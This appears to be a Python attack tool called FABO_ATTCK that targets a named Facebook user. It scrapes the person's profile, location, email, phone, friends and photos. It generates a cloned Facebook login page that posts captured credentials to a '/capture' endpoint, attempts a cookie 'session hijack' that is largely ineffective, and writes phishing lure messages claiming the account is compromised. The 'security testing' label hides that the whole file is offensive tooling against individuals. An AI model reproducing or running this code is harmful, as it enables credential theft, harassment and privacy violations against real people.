#!/usr/bin/env python3
"""
FABO_ATTCK v4.0 - Advanced Facebook Security Testing Framework
Professional Social Media Security Assessment

Author: F1REW0LF
License: MIT
"""

import sys
import os
import re
import json
import time
import socket
import random
import hashlib
import base64
import threading
import subprocess
import requests
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import argparse
from urllib3.exceptions import InsecureRequestWarning

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

VERSION = "4.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.BLUE}{Colors.BOLD}    ███████╗ █████╗ ██████╗  ██████╗     █████╗ ████████╗████████╗ ██████╗██╗  ██╗
    ██╔════╝██╔══██╗██╔══██╗██╔═══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝██║  ██║
    █████╗  ███████║██████╔╝██║   ██║   ███████║   ██║      ██║   ██║     ███████║
    ██╔══╝  ██╔══██║██╔══██╗██║   ██║   ██╔══██║   ██║      ██║   ██║     ██╔══██║
    ██║     ██║  ██║██████╔╝╚██████╔╝   ██║  ██║   ██║      ██║   ╚██████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝╚═╝  ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - SOCIAL SECURITY{Colors.WHITE}
{Colors.CYAN}    Professional Facebook Security Testing{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== FACEBOOK OSINT ENGINE ====================
class FacebookOSINT:
    def __init__(self, username: str):
        self.username = username
        self.base_url = f"https://facebook.com/{username}"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36'
        })
        self.results = {}
    
    def gather(self) -> Dict:
        cprint("\n[OSINT] Gathering Facebook intelligence...", Colors.BLUE)
        
        # 1. Profile info
        self.results['profile'] = self._get_profile()
        
        # 2. Public posts
        self.results['posts'] = self._get_posts()
        
        # 3. Friends
        self.results['friends'] = self._get_friends()
        
        # 4. Photos
        self.results['photos'] = self._get_photos()
        
        # 5. Contact info
        self.results['contact'] = self._extract_contact()
        
        # 6. Graph API
        self.results['graph'] = self._graph_api()
        
        return self.results
    
    def _get_profile(self) -> Dict:
        cprint("[*] Fetching profile...", Colors.DIM)
        
        info = {'name': 'Unknown', 'bio': 'Unknown', 'location': 'Unknown'}
        
        try:
            response = self.session.get(self.base_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Name
            title = soup.find('title')
            if title:
                info['name'] = title.text.replace(' | Facebook', '').strip()
            
            # Bio
            meta_desc = soup.find('meta', {'property': 'og:description'})
            if meta_desc:
                info['bio'] = meta_desc.get('content', 'Unknown')
            
            # Location
            loc_match = re.search(r'Lives in ([^<]+)', response.text)
            if loc_match:
                info['location'] = loc_match.group(1).strip()
            
            cprint(f"[+] Name: {info['name']}", Colors.GREEN)
            if info['location'] != 'Unknown':
                cprint(f"[+] Location: {info['location']}", Colors.GREEN)
        except:
            pass
        
        return info
    
    def _get_posts(self) -> List[Dict]:
        cprint("[*] Fetching public posts...", Colors.DIM)
        
        posts = []
        try:
            token = os.environ.get('FACEBOOK_TOKEN')
            if token:
                url = f'https://graph.facebook.com/{self.username}/posts?access_token={token}&limit=10'
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    for post in data.get('data', []):
                        posts.append({
                            'id': post.get('id'),
                            'message': post.get('message', ''),
                            'created': post.get('created_time')
                        })
                        if post.get('message'):
                            cprint(f"[+] Post: {post['message'][:50]}...", Colors.GREEN)
        except:
            pass
        
        return posts
    
    def _get_friends(self) -> List[Dict]:
        cprint("[*] Fetching friends...", Colors.DIM)
        
        friends = []
        try:
            token = os.environ.get('FACEBOOK_TOKEN')
            if token:
                url = f'https://graph.facebook.com/{self.username}/friends?access_token={token}&limit=20'
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    for friend in data.get('data', []):
                        friends.append({
                            'name': friend.get('name'),
                            'id': friend.get('id')
                        })
                        cprint(f"[+] Friend: {friend.get('name')}", Colors.GREEN)
        except:
            pass
        
        return friends
    
    def _get_photos(self) -> List[Dict]:
        cprint("[*] Fetching photos...", Colors.DIM)
        
        photos = []
        try:
            token = os.environ.get('FACEBOOK_TOKEN')
            if token:
                url = f'https://graph.facebook.com/{self.username}/photos?access_token={token}&limit=10'
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    for photo in data.get('data', []):
                        photos.append({
                            'id': photo.get('id'),
                            'url': photo.get('source'),
                            'created': photo.get('created_time')
                        })
                        cprint(f"[+] Photo: {photo.get('source', '')[:50]}...", Colors.GREEN)
        except:
            pass
        
        return photos
    
    def _extract_contact(self) -> Dict:
        cprint("[*] Extracting contact info...", Colors.DIM)
        
        contact = {'email': None, 'phone': None}
        
        try:
            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            response = self.session.get(self.base_url, timeout=10)
            
            emails = re.findall(email_pattern, response.text)
            if emails:
                contact['email'] = emails[0]
                cprint(f"[+] Email: {emails[0]}", Colors.GREEN)
            
            phone_pattern = r'(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}'
            phones = re.findall(phone_pattern, response.text)
            if phones:
                contact['phone'] = phones[0]
                cprint(f"[+] Phone: {phones[0]}", Colors.GREEN)
        except:
            pass
        
        return contact
    
    def _graph_api(self) -> Dict:
        cprint("[*] Querying Graph API...", Colors.DIM)
        
        result = {}
        token = os.environ.get('FACEBOOK_TOKEN')
        
        if not token:
            return result
        
        try:
            url = f'https://graph.facebook.com/{self.username}?access_token={token}'
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                result['profile'] = response.json()
                cprint("[+] Graph API profile retrieved", Colors.GREEN)
        except:
            pass
        
        return result

# ==================== FACEBOOK EXPLOIT ENGINE ====================
class FacebookExploit:
    def __init__(self, username: str):
        self.username = username
        self.base_url = f"https://facebook.com/{username}"
        self.session = requests.Session()
        self.results = {}
    
    def exploit(self) -> Dict:
        cprint("\n[EXPLOIT] Executing Facebook attacks...", Colors.RED)
        
        # 1. Phishing page
        self.results['phishing'] = self._create_phishing()
        
        # 2. Session hijack
        self.results['session'] = self._session_hijack()
        
        # 3. Social engineering
        self.results['social'] = self._social_engineering()
        
        return self.results
    
    def _create_phishing(self) -> str:
        cprint("[*] Creating phishing page...", Colors.DIM)
        
        html = f'''
<!DOCTYPE html>
<html>
<head><title>Facebook - Log In</title>
<style>
    * {{ margin: 0; padding: 0; box-sizing: border-box; }}
    body {{ font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .container {{ max-width: 400px; width: 100%; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
    .logo {{ text-align: center; font-size: 48px; color: #1877f2; font-weight: bold; margin-bottom: 20px; }}
    input {{ width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }}
    button {{ width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }}
</style>
</head>
<body>
    <div class="container">
        <div class="logo">f</div>
        <h2>Log in to Facebook</h2>
        <form method="POST" action="/capture">
            <input type="text" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <p style="text-align:center;margin-top:10px;color:#777;font-size:12px;">Target: {self.username}</p>
    </div>
</body>
</html>
'''
        
        filename = f'facebook_phishing_{int(time.time())}.html'
        with open(filename, 'w') as f:
            f.write(html)
        
        cprint(f"[+] Phishing page: {filename}", Colors.GREEN)
        return filename
    
    def _session_hijack(self) -> Optional[List]:
        cprint("[*] Attempting session hijack...", Colors.DIM)
        
        if SELENIUM_AVAILABLE:
            try:
                options = Options()
                options.add_argument('--headless=new')
                options.add_argument('--disable-blink-features=AutomationControlled')
                options.add_experimental_option('excludeSwitches', ['enable-automation'])
                
                driver = webdriver.Chrome(options=options)
                driver.get(self.base_url)
                time.sleep(3)
                cookies = driver.get_cookies()
                driver.quit()
                
                if cookies:
                    cprint("[+] Cookies captured", Colors.GREEN)
                    for cookie in cookies[:3]:
                        cprint(f"    {cookie.get('name')}: {cookie.get('value')[:20]}...", Colors.DIM)
                    return cookies
            except:
                pass
        
        try:
            response = self.session.get(self.base_url)
            cookies = response.cookies
            if cookies:
                cprint("[+] Session cookies captured", Colors.GREEN)
                return cookies
        except:
            pass
        
        cprint("[!] Session hijack failed", Colors.RED)
        return None
    
    def _social_engineering(self) -> List[str]:
        cprint("[*] Generating social engineering messages...", Colors.DIM)
        
        messages = [
            f"Hi, are you {self.username}? I found something about you.",
            f"Important: Your account {self.username} has been compromised.",
            f"Hey {self.username}, check this out: https://fake-link.com/profile",
            f"Facebook security alert for {self.username}. Verify now."
        ]
        
        filename = f'social_engineering_{int(time.time())}.txt'
        with open(filename, 'w') as f:
            for msg in messages:
                f.write(msg + '\n\n')
        
        cprint(f"[+] Messages saved: {filename}", Colors.GREEN)
        return messages

# ==================== MAIN FRAMEWORK ====================
class FaBoAttckUltimate:
    def __init__(self, username: str):
        self.username = username
        self.osint = FacebookOSINT(username)
        self.exploit = FacebookExploit(username)
        self.results = {}
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}FABO_ATTCK v4.0 - Attack Menu{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] OSINT - Information Gathering
[2] Phishing - Create Phishing Page
[3] Session Hijack - Capture Cookies
[4] Social Engineering - Generate Messages
[5] Full Attack (All Vectors)
[6] Show Results
[7] Exit
""")
    
    def osint_gather(self):
        self.results['osint'] = self.osint.gather()
    
    def phishing(self):
        self.results['phishing'] = self.exploit._create_phishing()
    
    def session_hijack(self):
        self.results['session'] = self.exploit._session_hijack()
    
    def social_eng(self):
        self.results['social'] = self.exploit._social_engineering()
    
    def full_attack(self):
        cprint("\n[FULL] Running full attack chain...", Colors.RED, bold=True)
        self.osint_gather()
        self.phishing()
        self.session_hijack()
        self.social_eng()
        cprint("\n[+] Full attack complete!", Colors.GREEN)
    
    def show_results(self):
        print("\n" + "="*60)
        cprint(" RESULTS", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        for key, value in self.results.items():
            if value:
                cprint(f"\n[{key.upper()}]", Colors.CYAN)
                if isinstance(value, dict):
                    for k, v in value.items():
                        if isinstance(v, (str, int, float)):
                            cprint(f"  {k}: {v}", Colors.DIM)
                        elif isinstance(v, list) and len(v) > 0:
                            cprint(f"  {k}: {len(v)} items", Colors.DIM)
                            for item in v[:3]:
                                if isinstance(item, dict):
                                    for ik, iv in item.items():
                                        if isinstance(iv, str) and len(iv) > 50:
                                            iv = iv[:50] + '...'
                                        cprint(f"    {ik}: {iv}", Colors.DIM)
                else:
                    print(str(value)[:500])
        
        print("="*60)
    
    def run(self):
        print_banner()
        cprint(f"[*] Target: {self.username}", Colors.CYAN)
        
        while True:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1': self.osint_gather()
            elif choice == '2': self.phishing()
            elif choice == '3': self.session_hijack()
            elif choice == '4': self.social_eng()
            elif choice == '5': self.full_attack()
            elif choice == '6': self.show_results()
            elif choice == '7':
                cprint("[*] Exiting...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description="FABO_ATTCK v4.0 - Facebook Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 fabo_attck.py -u username
  python3 fabo_attck.py -u username --full
  python3 fabo_attck.py -u username --osint
        """
    )
    
    parser.add_argument("-u", "--username", required=True, help="Facebook username")
    parser.add_argument("--full", action="store_true", help="Full attack")
    parser.add_argument("--osint", action="store_true", help="OSINT only")
    
    args = parser.parse_args()
    
    tool = FaBoAttckUltimate(args.username)
    
    if args.full:
        tool.full_attack()
        tool.show_results()
    elif args.osint:
        tool.osint_gather()
        tool.show_results()
    else:
        tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
